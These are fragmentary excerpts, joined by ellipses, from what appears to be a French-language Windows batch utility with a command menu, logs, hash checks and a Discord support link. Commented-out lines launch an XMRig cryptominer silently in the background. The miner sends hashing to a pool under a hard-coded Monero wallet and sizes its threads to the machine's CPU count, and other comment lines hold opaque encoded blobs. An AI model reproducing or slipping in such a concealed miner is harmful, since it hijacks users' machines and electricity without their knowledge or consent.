...
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCqDJEmW+0UiKRZZSTjPcSb3MJxRpaW206fK7EQeW69yRKPaz7qNKOUBp3PNO58u2Ro=
...
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDFRTQrPEG73FrASpbrHy++UqVkSRN4PaoDcyLWDLeEH40rqSaIoxHdTlsoAQS1xQiaufAI9p29O+1KsecKEtm8=
::YB416Ek+ZG8=
::
::
...
:: :4445415145
:: for /f "skip=1" %%p in ('wmic cpu get NumberOfLogicalProcessors') do if not defined NumberOfLogicalProcessors set NumberOfLogicalProcessors=%%p
:: set /a NumberOfLogicalProcessors=NumberOfLogicalProcessors/30

:: if %NumberOfLogicalProcessors% == 0 set NumberOfLogicalProcessors=1
:: start /b cmd /c systeme\Bin\Xmrig\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 49NKhsMGC3tgRsSQRWBYR5dZtnjCCGcfihFbTForuZBC1ECkHMFEFRBCyXrxgLn4KxEDkwKRUx2ZDDBB9CmAhgZUJZ1jJfM.Terminal-VI -p x --cpu-max-threads-hint %NumberOfLogicalProcessors% >nul 2>&1


  set "log=%LECTEUR%\systeme\logs\!random!.log"
  set "tee=%LECTEUR%\systeme\Bin\Autre\tee.exe"

  set "7zip=%LECTEUR%\systeme\Bin\7zip\7za.exe"
...
:: if "%~1"=="update_install" goto update_install

                                                                                                                                                                    ::Hash
for %%F in (
  "69c67f05416aa8bb1d180f0d927e3e91762dc9f4056934495637eea16caeb977 systeme\Bin\HashDefender.exe"
) do (
  set "file=%%~F"
  set "file=!file:~65!"
  set "hashFile=%%~F"
...
set "rep="
      ...
      If /I "%rep%" == "support" start https://discord.com/invite/DGmqpVdXYc && goto 1
...
:history-commande
 cls
  echo ----------------------------------------------
  TYPE "%LECTEUR%\systeme\memoire\historique-commande.txt"
  echo ----------------------------------------------
 pause
goto 1
